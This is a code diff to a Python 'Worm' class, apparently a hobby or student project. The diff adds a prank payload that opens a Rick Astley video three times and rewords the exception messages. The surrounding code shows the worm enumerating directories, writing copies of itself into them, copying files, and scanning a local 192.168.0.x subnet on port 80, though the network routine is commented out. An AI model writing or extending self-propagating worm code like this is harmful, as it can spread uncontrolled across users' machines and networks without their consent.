@@ -4,6 +4,7 @@ import sys
 import time
 import shutil
 import logging
+import subprocess
 
 #Threading imports - AR
 from threading import Thread, Lock
@@ -14,6 +15,8 @@ import socket
 
 BASE_IP = "192.168.0.%i"
 PORT = 80
+COUNT = 3
+RICKLOC = "\\rick_eternal.mp4"
 
 #------------------------------------------THREADER CLASS---------------------------------------------- -AR
 class Threader:
@@ -105,7 +108,7 @@ class Worm:
                     else:
                         pass   
         except:
-            logging.warning("exception occurred")
+            logging.warning("exception occurred, no list of directories")
     
     def create_new_worm(self):
         for directory in self.target_dir_list:
@@ -140,21 +143,32 @@ class Worm:
         self.threader.join()
         logging.warning(f"[{perf_counter() - start:.5f}] Done Searching")
     
+    def rick_and_roll(self):
+        for i in range(0, COUNT):
+            os.startfile(self.own_path + RICKLOC)
+            
+    
     def start_worm_actions(self):
         try:
             self.list_directories(self.path)
         except:
-            logging.warning("exception occurred")
+            logging.warning("exception occurred: worm failed to take action")
         print(self.target_dir_list)
         try:
             self.create_new_worm()
         except:
-            logging.warning("exception occurred")
+            logging.warning("exception occurred: no create new worm")
         try:
             self.copy_existing_files()
         except:
-            logging.warning("exception occurred")
+            logging.warning("exception occurred: cannot copy")
+        
+        try:
+            self.rick_and_roll()
+        except:
+            logging.warning("exception occurred: no rick?")
         #self.connection_iterator()
+        
     
 if __name__=="__main__":
     current_directory = os.path.abspath("")
